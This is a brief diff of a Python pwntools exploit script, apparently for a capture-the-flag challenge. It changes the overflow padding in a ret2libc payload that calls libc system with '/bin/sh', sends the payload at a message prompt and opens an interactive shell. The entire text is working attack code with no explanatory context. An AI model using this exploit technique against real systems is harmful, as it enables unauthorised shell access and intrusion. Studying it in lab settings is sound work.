@@ -14,7 +14,7 @@ sh_addr=libc_base+next(libc.search(b'/bin/sh'))
 ret_addr=next(elf.search(asm('ret')))
 log.info(ret_addr)
 
-payload=flat([cyclic(228),sys_addr,0,sh_addr])
+payload=flat([cyclic(60),sys_addr,0,sh_addr])
 
 p.sendlineafter("Leave some message for me :",payload)
 p.interactive()
